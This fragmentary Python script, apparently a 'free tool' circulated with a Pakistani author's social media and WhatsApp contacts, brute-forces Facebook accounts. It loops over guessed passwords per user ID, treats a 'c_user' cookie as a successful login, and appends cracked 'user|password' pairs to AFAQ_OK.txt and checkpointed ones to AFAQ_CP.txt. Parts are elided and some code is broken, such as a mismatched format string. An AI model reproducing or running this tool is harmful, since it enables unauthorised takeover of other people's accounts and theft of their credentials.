...
\033[1;35m💙💘✨____________💞💕❣️____________💘💝💕💓
  ...
  Auther   : FARYAL KHAN
  \033[1;37mFacebook : AFAQ CHOHAN 
  \033[1;36mYoutube  : AFAQ CHOHAN
  \033[1;37mNote     : FREE TOLL
  \033[1;37mVersion  : 0.1
  \033[1;35mWhatsapp : +923219502603
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mAFAQ_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mAFAQ_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back AFAQ Menu ")
	    mr()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[AFAQ] {loop}|{len(self.id)} \033[1;32m[ok][{len(ok)}] \033[1;31m[cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [AFAQ-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('AFAQ_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [AFAQ-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('AFAQ_CP.txt' , 'a').write('%s\n' % wrt)
                        break
